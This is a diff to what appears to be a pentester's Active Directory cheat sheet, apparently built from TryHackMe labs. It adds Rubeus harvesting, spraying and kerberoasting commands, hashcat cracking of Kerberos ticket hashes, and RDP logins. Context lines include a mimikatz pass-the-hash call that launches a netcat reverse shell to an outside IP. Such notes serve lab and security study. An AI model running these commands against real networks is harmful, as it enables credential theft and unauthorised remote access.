@@ -29,6 +29,8 @@
 - [samba](#samba)
   - [smbclient](#smbclient)
   - [rpcclinet](#rpcclient)
+- [mimikatz](#mimikatz)
+- [Rebeus](#rebeus)
 - [crackmapexec](#crackmapexec)
 - [kerbrute](#kerbrute)
 - [impacket](#impacket)
@@ -128,6 +130,7 @@ $ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
 $ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
 $ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
+$ hashcat -m 13100 -a 0 ./GetUserSPNs-py_hashcat.txt ./TestPasswordList.txt
 $ hashcat -m 18200 output_GetNPUsers.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -139,6 +142,10 @@ tag: RDP
 ```zsh
 $ xfreerdp /v:XXX.XXX.XXX.XXX /u:TestUser /p:TestPassword /dynamic-resolution +clipboard
 $ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:TestPassword /dynamic-resolution
+$ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:'P@$$W0rd' /dynamic-resolution
+# bad
+## $ has a special meaning
+## $ xfreerdp /v:XXX.XXX.XXX.XXX /d:hoge.com /u:TestUser /p:P@$$W0rd /dynamic-resolution
 ```
 `/dynamic-resolution` option may not work well.
 
@@ -585,6 +592,13 @@ mimikatz# tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.T
 mimikatz# sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /rc4:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.65.31 5556"
 ```
 
+# Rebeus
+```powershell
+PS> Rubeus.exe harvest /interval:30
+PS> echo XXX.XXX.XXX.XXX HOGE.com >> C:\Windows\System32\drivers\etc\hosts
+PS> Rubeus.exe brute /password:Password1 /noticket
+PS> Rubeus.exe kerberoast /outfile:hashes.txt
+```
 
 # DCSync
 ```ps
@@ -673,9 +687,10 @@ $ GetNPUsers.py -dc-host hoge.com -usersfile ./valid_userlist.txt -outputfile ./
 ## GetUserSPNs.py
 ```zsh
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo
-$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo r-request
+$ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo -request
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob
 $ GetUserSPNs.py -dc-ip 172.16.0.10 HOGE.com/piyo –request-user bob -outputfile bob_tgs
+$ GetUserSPNs.py HOGE.com/TestUser:TestPassword -dc-ip XXX.XXX.XXX.XXX -request -outputfile GetUserSPNs-py_hashcat.txt
 # -> Hashcat
 ```
 ## ntlmrelayx.py
